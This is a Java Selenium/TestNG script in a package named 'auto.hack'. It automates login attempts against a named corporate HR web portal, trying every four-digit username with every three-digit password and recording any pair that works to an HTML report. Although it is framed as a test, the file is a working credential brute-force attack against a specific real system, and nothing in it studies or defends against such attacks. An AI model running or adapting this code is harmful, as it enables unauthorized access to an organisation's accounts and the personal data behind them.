package auto.hack;
import auto.utility.ExtentManager;
import auto.utility.TShared;
import com.relevantcodes.extentreports.ExtentReports;
import com.relevantcodes.extentreports.ExtentTest;
import com.relevantcodes.extentreports.LogStatus;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.PageFactory;
import org.testng.annotations.BeforeSuite;

import org.testng.annotations.Test;
import pages.WP.Login;

import java.util.concurrent.TimeUnit;

public class elcom{
    public WebDriver driver;
    public final String PATH_SYSTEM = System.getProperty("user.dir");
    public final String PATH_GECKO_DRIVER = PATH_SYSTEM + "\\geckodriver.exe";
    public final String PATH_REPORT = PATH_SYSTEM + "\\src\\main\\resources\\report\\report.html";

    public ExtentReports extent;
    public ExtentTest test;

    @Test(priority=1)
    public void demo() throws InterruptedException {
        System.setProperty("webdriver.gecko.driver",PATH_GECKO_DRIVER);
        this.driver = new FirefoxDriver();
        this.driver.get("http://hrm.elcom.com.vn/lemonhr/");
        this.driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);
        driver.manage().window().maximize();

        this.driver = driver;
        PageFactory.initElements(driver,this);
        Login objLogin = new Login(driver);

        extent = ExtentManager.getReporter(PATH_REPORT);
        for(int i=1001;i<=9999;i++){
            for(int j=100;j<=999;j++){
                boolean flag = objLogin.test_account(Integer.toString(i),Integer.toString(j));
                if (flag==true){
                    test = extent.startTest(Integer.toString(i)+"/"+Integer.toString(j));
                    extent.endTest(test);
                    extent.flush();
                    driver.close();
                    break;
                }
            }
        }
        extent.close();
    }
}
